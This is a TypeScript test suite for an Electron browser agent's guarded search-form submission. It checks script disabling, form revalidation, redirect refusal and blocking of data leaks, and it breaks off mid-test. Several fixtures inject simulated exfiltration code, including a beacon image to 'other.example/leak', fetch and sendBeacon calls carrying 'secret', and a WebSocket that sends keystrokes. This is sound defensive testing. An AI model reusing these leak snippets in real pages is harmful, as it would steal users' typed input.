import assert from 'node:assert/strict'
import { once } from 'node:events'
import { existsSync } from 'node:fs'
import { createServer } from 'node:http'
import { connect } from 'node:net'
import { mkdtemp, rm } from 'node:fs/promises'
import { tmpdir } from 'node:os'
import { join, resolve } from 'node:path'
import test from 'node:test'
import { build } from 'esbuild'
import { _electron } from '@playwright/test'
import type { BrowserWindow, WebContents, WebContentsView, WebPreferences } from 'electron'
import type { BrowserRegistry } from './browser.ts'
import { createBrowserHistory } from './history.ts'
import type { createBrowserReadGrants } from './grant.ts'

interface BrowserFixture {
  ready: Promise<void>
  logs: string[]
  throwSearchLogs: boolean
  registry: BrowserRegistry
  browserWindow: BrowserWindow
  downloadItem(url: string, onSave: () => void): Electron.DownloadItem
  createSearchGrants: typeof createBrowserReadGrants
}

for (const shownParent of [true, false])
  test(
    `product search delivers native input without the Playwright precommit bypass (${shownParent ? 'shown' : 'hidden'} parent)`,
    { timeout: 30_000 },
    async () => {
      const temporary = await mkdtemp(join(tmpdir(), 'browser-search-native-input-'))
      const application = await launchRegistryProbe(
        '',
        temporary,
        false,
        join(temporary, 'home'),
        false,
        true
      )
      try {
        const result = await application.evaluate(async ({ app, WebContentsView }, shownParent) => {
          const state = globalThis as unknown as BrowserFixture
          await state.ready
          await state.browserWindow.loadURL(
            'data:text/html,<input id="owner" value="unchanged" autofocus>'
          )
          if (shownParent) {
            state.browserWindow.show()
            state.browserWindow.focus()
            state.browserWindow.webContents.focus()
          }
          const ownerFocusedBefore = state.browserWindow.webContents.isFocused()
          const target = await state.registry.createSearchTarget()
          const initial = state.registry.agentNavigationTarget(target.tabId).contents
          const requests: string[] = []
          await initial.session.protocol.handle('https', (request) => {
            requests.push(request.url)
            return new Response(
              new URL(request.url).pathname === '/'
                ? '<form action="/search"><input id="query" name="q" value="replace existing text"><button id="submit" type="submit">Search</button></form>'
                : '<main>Result</main>',
              { headers: { 'content-type': 'text/html; charset=utf-8' } }
            )
          })
          try {
            await state.registry.agentNavigate(
              target.tabId,
              'https://www.bing.com/',
              'https://www.bing.com'
            )
            await state.registry.dispatch({
              kind: 'bounds',
              tabId: target.tabId,
              x: 1,
              y: 2,
              width: 10,
              height: 10,
              visible: true,
            })
            const contents = state.registry.agentTarget(target.tabId).contents
            const view = state.browserWindow.contentView.children.find(
              (child) => child instanceof WebContentsView && child.webContents === contents
            ) as WebContentsView
            const presentation = {
              visible: view.getVisible(),
              bounds: view.getBounds(),
              javascript: (
                contents as WebContents & { getLastWebPreferences(): WebPreferences }
              ).getLastWebPreferences().javascript,
              webdriver: await contents.executeJavaScriptInIsolatedWorld(1003, [
                { code: 'navigator.webdriver' },
              ]),
              ownerDisabledFeatures: (
                state.browserWindow.webContents as WebContents & {
                  getLastWebPreferences(): WebPreferences
                }
              ).getLastWebPreferences().disableBlinkFeatures,
              backgroundThrottling: contents.getBackgroundThrottling(),
              ownerBackgroundThrottling: state.browserWindow.webContents.getBackgroundThrottling(),
            }
            const prepared = await state.registry.prepareSearchForm(
              target.tabId,
              {
                landingUrl: 'https://www.bing.com/',
                resultUrl: 'https://www.bing.com/search',
                inputSelector: '#query',
                submitSelector: '#submit',
                queryParameter: 'q',
                fields: {},
              },
              'native input',
              new AbortController().signal
            )
            await state.registry.executeSearchForm(prepared, () => true)
            const renderDeadlineMs = 5_000
            let renderTimer: ReturnType<typeof setTimeout> | undefined
            let resultRendered: unknown
            try {
              resultRendered = await Promise.race([
                contents.executeJavaScriptInIsolatedWorld(1003, [
                  {
                    code: 'new Promise(resolve => requestAnimationFrame(() => requestAnimationFrame(() => resolve(document.readyState === "complete" && innerWidth > 0 && innerHeight > 0))))',
                  },
                ]),
                new Promise((_, reject) => {
                  renderTimer = setTimeout(
                    () => reject(new Error('result rendering stalled')),
                    renderDeadlineMs
                  )
                }),
              ])
            } finally {
              clearTimeout(renderTimer)
            }
            return {
              requests,
              presentation,
              resultRendered,
              visibleAfter: view.getVisible(),
              ownerVisible: state.browserWindow.isVisible(),
              url: state.registry.agentTarget(target.tabId).url,
              bypass: app.commandLine.hasSwitch('allow-pre-commit-input'),
              disabledFeatures: app.commandLine.getSwitchValue('disable-features'),
              ownerFocusedBefore,
              ownerFocused: state.browserWindow.webContents.isFocused(),
              ownerValue: await state.browserWindow.webContents.executeJavaScript(
                'document.querySelector("#owner").value'
              ),
              logs: state.logs.filter((line) => line.startsWith('[browser-search-')),
            }
          } finally {
            target.close()
          }
        }, shownParent)
        assert.equal(result.bypass, false)
        assert.equal(result.disabledFeatures, '')
        assert.equal(result.presentation.visible, false)
        assert.equal(result.visibleAfter, false)
        assert.equal(result.ownerVisible, shownParent)
        assert.equal(result.resultRendered, true)
        assert.equal(result.presentation.webdriver, false)
        assert.equal(result.presentation.ownerDisabledFeatures, undefined)
        assert.equal(result.presentation.javascript, false)
        assert.equal(result.presentation.backgroundThrottling, false)
        assert.equal(result.presentation.ownerBackgroundThrottling, true)
        assert.ok(result.presentation.bounds.width > 0 && result.presentation.bounds.height > 0)
        assert.equal(result.url, 'https://www.bing.com/search?q=native+input')
        assert.deepEqual(result.requests, ['https://www.bing.com/', result.url])
        assert.equal(result.ownerFocused, result.ownerFocusedBefore)
        assert.equal(result.ownerValue, 'unchanged')
        assert.ok(result.logs.some((line) => line.includes('"phase":"completed"')))
        const rendering = result.logs
          .filter((line) => line.startsWith('[browser-search-render] '))
          .map((line) => JSON.parse(line.slice('[browser-search-render] '.length)))
        assert.ok(rendering.filter((event) => event.phase === 'document-ready').length >= 2)
        assert.ok(rendering.some((event) => event.phase === 'layout'))
        assert.ok(
          rendering.every(
            (event) => event.visible === false && event.backgroundThrottling === false
          )
        )
      } finally {
        await application.close()
        await rm(temporary, { recursive: true, force: true })
      }
    }
  )

test(
  'product search uses form.submit without serializing the named submitter',
  { timeout: 30_000 },
  async () => {
    const temporary = await mkdtemp(join(tmpdir(), 'browser-search-submitter-'))
    const application = await launchRegistryProbe('', temporary)
    try {
      const results = await application.evaluate(async () => {
        const state = globalThis as unknown as BrowserFixture
        await state.ready
        const results = []
        for (const position of ['middle', 'first', 'last', 'throwing-log']) {
          state.throwSearchLogs = position === 'throwing-log'
          const target = await state.registry.createSearchTarget()
          const initial = state.registry.agentNavigationTarget(target.tabId).contents
          const requests: string[] = []
          const input = '<input id="sb_form_q" name="q" type="search">'
          const submit =
            '<input id="sb_form_go" type="submit" name="search" value=""><label id="search_icon" for="sb_form_go">Search</label>'
          const hidden = '<input type="hidden" name="form" value="QBLH">'
          const controls =
            position === 'first'
              ? submit + input + hidden
              : position === 'last'
                ? input + hidden + submit
                : input + submit + hidden
          await initial.session.protocol.handle('https', (request) => {
            requests.push(request.url)
            return new Response(
              new URL(request.url).pathname === '/'
                ? `<form action="/search">${controls}</form>`
                : '<main>Result</main>',
              { headers: { 'content-type': 'text/html; charset=utf-8' } }
            )
          })
          await state.registry.agentNavigate(
            target.tabId,
            'https://cn.bing.com/',
            'https://cn.bing.com'
          )
          const config = {
            landingUrl: 'https://cn.bing.com/',
            resultUrl: 'https://cn.bing.com/search',
            inputSelector: '#sb_form_q',
            submitSelector: '#search_icon',
            queryParameter: 'q',
            submitter: { name: 'search', value: '' },
            fields: { form: { pattern: '^QBLH$', maxLength: 4 } },
          }
          const prepared = await state.registry.prepareSearchForm(
            target.tabId,
            config,
            '中文 a&b',
            new AbortController().signal
          )
          config.submitter.value = 'changed outside frozen plan'
          await state.registry.executeSearchForm(prepared, () => true)
          const destination = state.registry.agentTarget(target.tabId).url
          target.close()
          const diagnostics = state.logs.filter(
            (line) => line.startsWith('[browser-search-') && line.includes(target.tabId)
          )
          results.push({
            position,
            requests,
            destination,
            prepared: prepared.destinationUrl,
            diagnostics,
          })
        }
        return results
      })
      for (const result of results) {
        const query = 'q=%E4%B8%AD%E6%96%87+a%26b'
        const parameters = `${query}&form=QBLH`
        assert.equal(result.destination, `https://cn.bing.com/search?${parameters}`)
        assert.equal(result.prepared, result.destination)
        assert.deepEqual(result.requests, ['https://cn.bing.com/', result.destination])
        const diagnostics = result.diagnostics.map(
          (line) =>
            JSON.parse(line.slice(line.indexOf('{'))) as {
              phase: string
              allowed?: boolean
            }
        )
        for (const phase of ['request-filter', 'intent-guard', 'start-guard', 'commit-guard'])
          assert.ok(
            diagnostics.some((event) => event.phase === phase && event.allowed === true),
            phase
          )
        assert.ok(diagnostics.some((event) => event.phase === 'submit_ack'))
        assert.equal(result.diagnostics.join('\n').includes('中文'), false)
        assert.equal(result.diagnostics.join('\n').includes('q='), false)
      }
    } finally {
      await application.close()
      await rm(temporary, { recursive: true, force: true })
    }
  }
)

test(
  'product search rejects named submitter mismatches, duplicates, overrides and stale values before input',
  { timeout: 30_000 },
  async () => {
    const temporary = await mkdtemp(join(tmpdir(), 'browser-search-submitter-denied-'))
    const application = await launchRegistryProbe('', temporary)
    try {
      const results = await application.evaluate(async () => {
        const state = globalThis as unknown as BrowserFixture
        await state.ready
        const results = []
        for (const scenario of [
          'unconfigured',
          'wrong-name',
          'wrong-value',
          'query-collision',
          'hidden-before',
          'hidden-after',
          'multiple-submit',
          'formaction',
          'formmethod',
          'formenctype',
          'formtarget',
          'stale-name',
          'stale-value',
        ]) {
          const target = await state.registry.createSearchTarget()
          const initial = state.registry.agentNavigationTarget(target.tabId).contents
          const requests: string[] = []
          const name =
            scenario === 'wrong-name' ? 'other' : scenario === 'query-collision' ? 'q' : 'search'
          const value = scenario === 'wrong-value' ? 'different' : ''
          const extra = '<input type="hidden" name="search" value="">'
          const override = scenario.startsWith('form') ? `${scenario}=""` : ''
          await initial.session.protocol.handle('https', (request) => {
            requests.push(request.url)
            return new Response(
              `<form action="/search"><input id="query" name="q" type="search">
            ${scenario === 'hidden-before' ? extra : ''}<input id="submit-control" type="submit" name="${name}" value="${value}" ${override}>
            <label id="submit" for="submit-control">Search</label>${scenario === 'hidden-after' ? extra : ''}
            ${scenario === 'multiple-submit' ? '<button type="submit">Other</button>' : ''}</form>`,
              { headers: { 'content-type': 'text/html; charset=utf-8' } }
            )
          })
          await state.registry.agentNavigate(
            target.tabId,
            'https://cn.bing.com/',
            'https://cn.bing.com'
          )
          const config = {
            landingUrl: 'https://cn.bing.com/',
            resultUrl: 'https://cn.bing.com/search',
            inputSelector: '#query',
            submitSelector: '#submit',
            queryParameter: 'q',
            ...(scenario === 'unconfigured'
              ? {}
              : {
                  submitter: { name: scenario === 'query-collision' ? 'q' : 'search', value: '' },
                }),
            fields: { search: { pattern: '^$', maxLength: 0 } },
          }
          const contents = state.registry.agentTarget(target.tabId).contents
          let inserted = 0
          const original = contents.debugger.sendCommand.bind(contents.debugger)
          contents.debugger.sendCommand = async (method, parameters) => {
            if (method === 'Input.insertText') inserted += 1
            return await original(method, parameters)
          }
          const error = await state.registry
            .prepareSearchForm(target.tabId, config, 'public query', new AbortController().signal)
            .then(async (prepared) => {
              if (scenario.startsWith('stale'))
                await contents.executeJavaScriptInIsolatedWorld(1003, [
                  {
                    code: `document.querySelector('#submit-control').${scenario === 'stale-name' ? 'name' : 'value'} = 'changed'; null`,
                  },
                ])
              await state.registry.executeSearchForm(prepared, () => true)
            })
            .then(
              () => 'allowed',
              (error) => error.message
            )
          target.close()
          results.push({ scenario, error, inserted, requests })
        }
        return results
      })
      for (const result of results) {
        assert.notEqual(result.error, 'allowed', result.scenario)
        assert.equal(result.inserted, 0, result.scenario)
        assert.deepEqual(result.requests, ['https://cn.bing.com/'], result.scenario)
      }
    } finally {
      await application.close()
      await rm(temporary, { recursive: true, force: true })
    }
  }
)

test(
  'product search exposes only a fresh one-use blocked homepage redirect receipt',
  { timeout: 60_000 },
  async () => {
    const temporary = await mkdtemp(join(tmpdir(), 'browser-search-regional-'))
    const application = await launchRegistryProbe('', temporary)
    try {
      const results = await application.evaluate(async () => {
        const state = globalThis as unknown as BrowserFixture
        await state.ready
        const registry = state.registry
        const requestedUrl = 'https://www.bing.com/?source=home'
        const regionalUrl = 'https://cn.bing.com/?mkt=zh-CN'
        const results = []
        for (const scenario of [
          'consume',
          'new-attempt',
          'cancel',
          'close',
          'external',
          'expired',
          'ordinary',
          'same-origin',
        ]) {
          const target =
            scenario === 'ordinary'
              ? await registry.createAgentTarget('ordinary-session')
              : await registry.createSearchTarget()
          const initial = registry.agentNavigationTarget(target.tabId).contents
          const requests: string[] = []
          await initial.session.protocol.handle('https', (request) => {
            requests.push(request.url)
            if (request.url === requestedUrl)
              return new Response(null, {
                status: 302,
                headers: {
                  location:
                    scenario === 'same-origin' ? 'https://www.bing.com/?region=cn' : regionalUrl,
                },
              })
            return new Response('<title>Loaded homepage</title>', {
              headers: { 'content-type': 'text/html; charset=utf-8' },
            })
          })
          const outcome = await registry
            .agentNavigate(target.tabId, requestedUrl, 'https://www.bing.com')
            .then(
              () => 'loaded',
              (error) => error.message
            )
          if (scenario === 'new-attempt')
            await registry.agentNavigate(
              target.tabId,
              'https://www.bing.com/stable',
              'https://www.bing.com'
            )
          if (scenario === 'cancel') registry.cancelAgentNavigation(target.tabId)
          if (scenario === 'close') target.close()
          if (scenario === 'external')
            initial.emit('did-navigate-in-page', {} as Electron.Event, 'about:blank#external', true)
          const now = Date.now
          if (scenario === 'expired') Date.now = () => now() + 60_000
          let receipt
          try {
            receipt = registry.takeSearchRedirect(target.tabId)
          } finally {
            Date.now = now
          }
          const replay = registry.takeSearchRedirect(target.tabId)
          target.close()
          results.push({ scenario, outcome, requests, receipt, replay })
        }
        return results
      })
      for (const result of results) {
        assert.equal(result.replay, null, result.scenario)
        if (result.scenario === 'consume') {
          assert.deepEqual(result.receipt, {
            requestedUrl: 'https://www.bing.com/?source=home',
            url: 'https://cn.bing.com/?mkt=zh-CN',
          })
        } else assert.equal(result.receipt, null, result.scenario)
        if (result.scenario === 'same-origin') {
          assert.equal(result.outcome, 'loaded')
          assert.deepEqual(result.requests, [
            'https://www.bing.com/?source=home',
            'https://www.bing.com/?region=cn',
          ])
        } else {
          assert.equal(result.outcome, 'navigation_outcome_unknown', result.scenario)
          assert.deepEqual(
            result.requests,
            result.scenario === 'new-attempt'
              ? ['https://www.bing.com/?source=home', 'https://www.bing.com/stable']
              : ['https://www.bing.com/?source=home'],
            result.scenario
          )
        }
      }
    } finally {
      await application.close()
      await rm(temporary, { recursive: true, force: true })
    }
  }
)

test(
  'product search disables page scripts from birth while host inspection and native GET remain available',
  { timeout: 30_000 },
  async () => {
    const temporary = await mkdtemp(join(tmpdir(), 'browser-search-scriptless-'))
    const application = await launchRegistryProbe('', temporary)
    try {
      const result = await application.evaluate(async () => {
        const state = globalThis as unknown as BrowserFixture
        await state.ready
        const registry = state.registry
        const target = await registry.createSearchTarget()
        const initial = registry.agentNavigationTarget(target.tabId).contents
        const javascript = (contents: WebContents) =>
          (
            contents as WebContents & {
              getLastWebPreferences(): WebPreferences
            }
          ).getLastWebPreferences().javascript
        const initialJavaScript = javascript(initial)
        const requests: string[] = []
        const html = `<form action="/search" method="get"><input id="query" name="q"
        oninput="document.documentElement.dataset.input = 'ran'">
        <button id="submit" type="submit">Search</button></form>
        <script>document.documentElement.dataset.inline = 'ran';
        if (location.pathname === '/') {
          window.socket = new WebSocket('wss://127.0.0.1:9/');
          document.documentElement.dataset.socket = 'constructed';
          document.querySelector('input').addEventListener('input', () => {
            if (window.socket.readyState === WebSocket.OPEN) window.socket.send(document.querySelector('input').value);
          });
        }</script><script src="/page.js"></script>`
        const handle = (request: Request) => {
          requests.push(request.url)
          return new Response(
            new URL(request.url).pathname === '/page.js'
              ? "document.documentElement.dataset.external = 'ran'"
              : html,
            {
              headers: {
                'content-type':
                  new URL(request.url).pathname === '/page.js'
                    ? 'text/javascript'
                    : 'text/html; charset=utf-8',
              },
            }
          )
        }
        await initial.session.protocol.handle('https', handle)
        await registry.agentNavigate(target.tabId, 'https://www.bing.com/', 'https://www.bing.com')
        const contents = registry.agentTarget(target.tabId).contents
        const read = async () =>
          await contents.executeJavaScriptInIsolatedWorld(1003, [
            {
              code: `({inline: document.documentElement.dataset.inline ?? null,
          external: document.documentElement.dataset.external ?? null,
          input: document.documentElement.dataset.input ?? null,
          socket: document.documentElement.dataset.socket ?? null,
          value: document.querySelector('input').value})`,
            },
          ])
        const homepage = await read()
        const prepared = await registry.prepareSearchForm(
          target.tabId,
          {
            landingUrl: 'https://www.bing.com/',
            resultUrl: 'https://www.bing.com/search',
            inputSelector: '#query',
            submitSelector: '#submit',
            queryParameter: 'q',
            fields: {},
          },
          'public query',
          new AbortController().signal
        )
        let afterInput: unknown
        const original = contents.debugger.sendCommand.bind(contents.debugger)
        contents.debugger.sendCommand = async (method, parameters) => {
          const response = await original(method, parameters)
          if (method === 'Input.insertText') afterInput = await read()
          return response
        }
        await registry.executeSearchForm(prepared, () => true)
        const destination = registry.agentTarget(target.tabId).url
        const resultJavaScript = javascript(contents)
        const replaced = contents !== initial
        target.close()
        const ordinary = await registry.createAgentTarget('ordinary-session')
        const ordinaryInitial = registry.agentNavigationTarget(ordinary.tabId).contents
        await ordinaryInitial.session.protocol.handle('https', handle)
        await registry.agentNavigate(
          ordinary.tabId,
          'https://www.bing.com/ordinary',
          'https://www.bing.com'
        )
        const ordinaryContents = registry.agentTarget(ordinary.tabId).contents
        const ordinaryScripts = await ordinaryContents.executeJavaScript(
          '({inline:document.documentElement.dataset.inline,external:document.documentElement.dataset.external})'
        )
        const ordinaryJavaScript = javascript(ordinaryContents)
        ordinary.close()
        return {
          initialJavaScript,
          resultJavaScript,
          replaced,
          homepage,
          afterInput,
          destination,
          ordinaryJavaScript,
          ordinaryScripts,
          requests,
        }
      })
      assert.equal(result.initialJavaScript, false)
      assert.equal(result.resultJavaScript, false)
      assert.equal(result.replaced, true)
      assert.deepEqual(result.homepage, {
        inline: null,
        external: null,
        input: null,
        socket: null,
        value: '',
      })
      assert.deepEqual(result.afterInput, {
        inline: null,
        external: null,
        input: null,
        socket: null,
        value: 'public query',
      })
      assert.equal(result.destination, 'https://www.bing.com/search?q=public+query')
      assert.equal(result.ordinaryJavaScript, true)
      assert.deepEqual(result.ordinaryScripts, { inline: 'ran', external: 'ran' })
    } finally {
      await application.close()
      await rm(temporary, { recursive: true, force: true })
    }
  }
)

test(
  'product search submits a real isolated GET form and blocks host-injected input-triggered data requests',
  { timeout: 30_000 },
  async () => {
    const temporary = await mkdtemp(join(tmpdir(), 'browser-search-form-'))
    const application = await launchRegistryProbe('', temporary)
    try {
      const result = await application.evaluate(async () => {
        const state = globalThis as unknown as BrowserFixture
        await state.ready
        const registry = state.registry
        const target = await registry.createSearchTarget()
        const page = registry.agentNavigationTarget(target.tabId).contents
        const requests: Array<{ url: string; method: string }> = []
        await page.session.protocol.handle('https', (request) => {
          requests.push({ url: request.url, method: request.method })
          const homepage = new URL(request.url).pathname === '/'
          return new Response(
            homepage
              ? `<form action="/search" method="get">
          <input id="sb_form_q" name="q" type="search"><input name="form" type="hidden" value="QBLH">
          <button id="search_icon" type="submit">Search</button></form>`
              : '<main id="b_results">Result</main>',
            { headers: { 'content-type': 'text/html; charset=utf-8' } }
          )
        })
        await registry.agentNavigate(target.tabId, 'https://www.bing.com/', 'https://www.bing.com')
        await registry.agentTarget(target.tabId).contents.executeJavaScriptInIsolatedWorld(1003, [
          {
            code: `
          document.querySelector('input').addEventListener('input', () => {
            document.documentElement.dataset.hostAttack = 'ran';
            fetch('/input-post', {method:'POST', body:'secret'}).catch(() => {});
            fetch('/input-get?q=secret').catch(() => {});
            navigator.sendBeacon('/input-beacon', 'secret');
            new Image().src = 'https://other.example/leak?q=secret';
            new Image().src = '/collect?term=' + encodeURIComponent(document.querySelector('input').value);
            const script = document.createElement('script');
            script.src = '/script/' + encodeURIComponent(document.querySelector('input').value);
            document.body.append(script);
          }); null`,
          },
        ])
        const prepared = await registry.prepareSearchForm(
          target.tabId,
          {
            landingUrl: 'https://www.bing.com/',
            resultUrl: 'https://www.bing.com/search',
            inputSelector: '#sb_form_q',
            submitSelector: '#search_icon',
            queryParameter: 'q',
            fields: { form: { pattern: '^[A-Za-z0-9_-]{1,32}$', maxLength: 32 } },
          },
          '中文 a&b',
          new AbortController().signal
        )
        const scope = {
          sessionId: 'search-session',
          instanceId: 'search-instance',
          productTurnId: 'product-turn',
          turnId: 'search-turn',
          generation: 1,
          interruptGeneration: 0,
          lifecycleEpoch: 1,
        }
        const grants = state.createSearchGrants({
          scope: () => scope,
          target: (tabId) => registry.agentTarget(tabId),
          policy: () => ({ revision: 1, decision: 'allow' }),
          navigatePolicy: () => ({ revision: 1, decision: 'allow' }),
        })
        const read = grants.prepareRead({
          sessionId: scope.sessionId,
          turnId: scope.turnId,
          requestId: 'read-home',
          tabId: target.tabId,
          intent: 'Inspect search form',
        })
        const authority = await grants.acquireSnapshot({
          scope,
          requestId: read.requestId,
          proofId: read.proofId,
          tabId: target.tabId,
        })
        const search = grants.issueSearch({
          authority,
          requestId: 'submit-query',
          url: prepared.destinationUrl,
          query: '中文 a&b',
          parameter: 'q',
        })
        grants.claimSearch(search)
        const invalidations: string[] = []
        const unsubscribe = registry.onAgentTargetInvalidated((tabId, kind, reason) => {
          if (tabId === target.tabId) {
            grants.revokeTab(tabId, kind === 'target' && reason === 'navigation')
            invalidations.push(kind)
          }
        })
        const source = registry.agentTarget(target.tabId)
        let hostAttack = false
        const original = source.contents.debugger.sendCommand.bind(source.contents.debugger)
        source.contents.debugger.sendCommand = async (method, parameters) => {
          const response = await original(method, parameters)
          if (method === 'Input.insertText')
            hostAttack = await source.contents.executeJavaScriptInIsolatedWorld(1003, [
              { code: "document.documentElement.dataset.hostAttack === 'ran'" },
            ])
          return response
        }
        const forged = await registry
          .executeSearchForm({ ...prepared }, () => true)
          .then(
            () => 'allowed',
            (error) => error.message
          )
        await registry.executeSearchForm(prepared, () => grants.validateSearch(search))
        const destination = registry.agentTarget(target.tabId)
        const replay = await registry
          .executeSearchForm(prepared, () => true)
          .then(
            () => 'allowed',
            (error) => error.message
          )
        const grantValid = grants.validateSearch(search)
        unsubscribe()
        target.close()
        return {
          requests,
          destination: destination.url,
          prepared: prepared.destinationUrl,
          grantValid,
          sameInstance: source.instanceId === destination.instanceId,
          generationChanged: source.generation < destination.generation,
          invalidations,
          forged,
          replay,
          hostAttack,
        }
      })
      assert.equal(
        result.destination,
        'https://www.bing.com/search?q=%E4%B8%AD%E6%96%87+a%26b&form=QBLH'
      )
      assert.equal(result.prepared, result.destination)
      assert.equal(result.sameInstance, true)
      assert.equal(result.generationChanged, true)
      assert.equal(result.grantValid, true)
      assert.equal(result.hostAttack, true)
      assert.ok(result.invalidations.length > 0)
      assert.ok(result.invalidations.every((kind) => kind === 'target'))
      assert.match(result.forged, /form_stale/)
      assert.match(result.replay, /form_stale/)
      assert.deepEqual(result.requests, [
        { url: 'https://www.bing.com/', method: 'GET' },
        { url: result.destination, method: 'GET' },
      ])
    } finally {
      await application.close()
      await rm(temporary, { recursive: true, force: true })
    }
  }
)

test(
  'product search revalidates changed form payloads before atomic submission and rejects stale scope',
  { timeout: 60_000 },
  async () => {
    const temporary = await mkdtemp(join(tmpdir(), 'browser-search-form-denied-'))
    const application = await launchRegistryProbe('', temporary)
    try {
      const results = await application.evaluate(async () => {
        const state = globalThis as unknown as BrowserFixture
        await state.ready
        const registry = state.registry
        const results = []
        for (const scenario of [
          'hidden',
          'cross-origin',
          'wrong-path',
          'duplicate-query',
          'changed-query',
          'method-post',
          'revoked',
          'aborted',
        ]) {
          const target = await registry.createSearchTarget()
          const page = registry.agentNavigationTarget(target.tabId).contents
          const requests: string[] = []
          await page.session.protocol.handle('https', (request) => {
            requests.push(request.url)
            return new Response(
              `<form action="/search" method="get"><input id="sb_form_q" name="q" type="search">
            <input name="form" type="hidden" value="QBLH"><button id="search_icon" type="submit">Search</button></form>`,
              { headers: { 'content-type': 'text/html; charset=utf-8' } }
            )
          })
          await registry.agentNavigate(
            target.tabId,
            'https://www.bing.com/',
            'https://www.bing.com'
          )
          const signal = new AbortController()
          const prepared = await registry.prepareSearchForm(
            target.tabId,
            {
              landingUrl: 'https://www.bing.com/',
              resultUrl: 'https://www.bing.com/search',
              inputSelector: '#sb_form_q',
              submitSelector: '#search_icon',
              queryParameter: 'q',
              fields: { form: { pattern: '^[A-Za-z0-9_-]{1,32}$', maxLength: 32 } },
            },
            'public query',
            signal.signal
          )
          const contents = registry.agentTarget(target.tabId).contents
          const changes: Record<string, string> = {
            hidden:
              "document.querySelector('form').insertAdjacentHTML('beforeend', '<input type=hidden name=extra value=secret>')",
            'cross-origin':
              "document.querySelector('form').action = 'https://other.example/search'",
            'wrong-path': "document.querySelector('form').action = '/other'",
            'duplicate-query':
              "document.querySelector('form').insertAdjacentHTML('beforeend', '<input type=hidden name=q value=extra>')",
            'changed-query': "document.querySelector('input').value = 'different'",
            'method-post': "document.querySelector('form').method = 'post'",
          }
          if (changes[scenario])
            await contents.executeJavaScriptInIsolatedWorld(1003, [
              {
                code: `document.querySelector('input').addEventListener('input', () => { ${changes[scenario]} }); null`,
              },
            ])
          let authorized = true
          const original = contents.debugger.sendCommand.bind(contents.debugger)
          if (scenario === 'revoked' || scenario === 'aborted') {
            contents.debugger.sendCommand = async (method, parameters) => {
              const result = await original(method, parameters)
              if (method === 'Input.insertText') {
                if (scenario === 'aborted') signal.abort()
                else authorized = false
              }
              return result
            }
          }
          const error = await registry
            .executeSearchForm(prepared, () => authorized)
            .then(
              () => 'allowed',
              (error) => error.message
            )
          target.close()
          results.push({ scenario, error, requests })
        }
        return results
      })
      for (const result of results) {
        assert.notEqual(result.error, 'allowed', result.scenario)
        if (!['revoked', 'aborted'].includes(result.scenario))
          assert.equal(
            result.error,
            result.scenario === 'changed-query'
              ? 'browser_search_form_stale'
              : 'browser_search_form_invalid',
            result.scenario
          )
        assert.deepEqual(result.requests, ['https://www.bing.com/'], result.scenario)
      }
    } finally {
      await application.close()
      await rm(temporary, { recursive: true, force: true })
    }
  }
)

test(
  'product search rejects unsafe initial forms and host-injected focus hijacking before entering the query',
  { timeout: 30_000 },
  async () => {
    const temporary = await mkdtemp(join(tmpdir(), 'browser-search-form-input-'))
    const application = await launchRegistryProbe('', temporary)
    try {
      const results = await application.evaluate(async () => {
        const state = globalThis as unknown as BrowserFixture
        await state.ready
        const registry = state.registry
        const config = {
          landingUrl: 'https://www.bing.com/',
          resultUrl: 'https://www.bing.com/search',
          inputSelector: '#sb_form_q',
          submitSelector: '#search_icon',
          queryParameter: 'q',
          fields: { form: { pattern: '^[A-Za-z0-9_-]{1,32}$', maxLength: 32 } },
        }
        const results = []
        for (const scenario of [
          'unknown-hidden',
          'prototype-field',
          'multiple-submit',
          'password',
          'readonly',
          'post',
          'charset',
          'focus',
        ]) {
          const target = await registry.createSearchTarget()
          const page = registry.agentNavigationTarget(target.tabId).contents
          const hidden =
            scenario === 'unknown-hidden'
              ? '<input type="hidden" name="extra" value="secret">'
              : scenario === 'prototype-field'
                ? '<input type="hidden" name="constructor" value="secret">'
                : ''
          const otherSubmit =
            scenario === 'multiple-submit' ? '<button type="submit">Other submit</button>' : ''
          await page.session.protocol.handle(
            'https',
            () =>
              new Response(
                `<form action="/search" method="${scenario === 'post' ? 'post' : 'get'}">
          <input id="sb_form_q" name="q" type="${scenario === 'password' ? 'password' : 'search'}"
          ${scenario === 'readonly' ? 'readonly' : ''}>
          <button id="search_icon" type="submit">Search</button>${hidden}${otherSubmit}</form>
          <input id="other" value="kept">`,
                {
                  headers: {
                    'content-type': `text/html; charset=${scenario === 'charset' ? 'windows-1252' : 'utf-8'}`,
                  },
                }
              )
          )
          await registry.agentNavigate(target.tabId, config.landingUrl, 'https://www.bing.com')
          const contents = registry.agentTarget(target.tabId).contents
          if (scenario === 'focus')
            await contents.executeJavaScriptInIsolatedWorld(1003, [
              {
                code: "document.querySelector('#sb_form_q').addEventListener('focus', () => document.querySelector('#other').focus()); null",
              },
            ])
          let inserted = 0
          const original = contents.debugger.sendCommand.bind(contents.debugger)
          contents.debugger.sendCommand = async (method, parameters) => {
            if (method === 'Input.insertText') inserted += 1
            return await original(method, parameters)
          }
          const error = await registry
            .prepareSearchForm(target.tabId, config, 'public query', new AbortController().signal)
            .then((prepared) => registry.executeSearchForm(prepared, () => true))
            .then(
              () => 'allowed',
              (error) => error.message
            )
          target.close()
          results.push({ scenario, error, inserted })
        }
        const ordinary = await registry.createAgentTarget('ordinary-session')
        const denied = await registry
          .prepareSearchForm(ordinary.tabId, config, 'public query', new AbortController().signal)
          .then(
            () => 'allowed',
            (error) => error.message
          )
        ordinary.close()
        results.push({ scenario: 'ordinary-target', error: denied, inserted: 0 })
        return results
      })
      for (const result of results) {
        assert.notEqual(result.error, 'allowed', result.scenario)
        assert.equal(result.inserted, 0, result.scenario)
      }
    } finally {
      await application.close()
      await rm(temporary, { recursive: true, force: true })
    }
  }
)

test(
  'product search refuses same-origin and cross-origin redirects after one exact submission',
  { timeout: 30_000 },
  async () => {
    const temporary = await mkdtemp(join(tmpdir(), 'browser-search-form-redirect-'))
    const application = await launchRegistryProbe('', temporary)
    try {
      const results = await application.evaluate(async () => {
        const state = globalThis as unknown as BrowserFixture
        await state.ready
        const results = []
        for (const redirect of [
          'https://www.bing.com/other?q=query',
          'https://other.example/search?q=query',
        ]) {
          const target = await state.registry.createSearchTarget()
          const page = state.registry.agentNavigationTarget(target.tabId).contents
          const requests: string[] = []
          await page.session.protocol.handle('https', (request) => {
            requests.push(request.url)
            if (new URL(request.url).pathname !== '/')
              return new Response(null, { status: 302, headers: { location: redirect } })
            return new Response(
              '<form action="/search"><input id="query" name="q"><button id="submit" type="submit">Search</button></form>',
              { headers: { 'content-type': 'text/html; charset=utf-8' } }
            )
          })
          await state.registry.agentNavigate(
            target.tabId,
            'https://www.bing.com/',
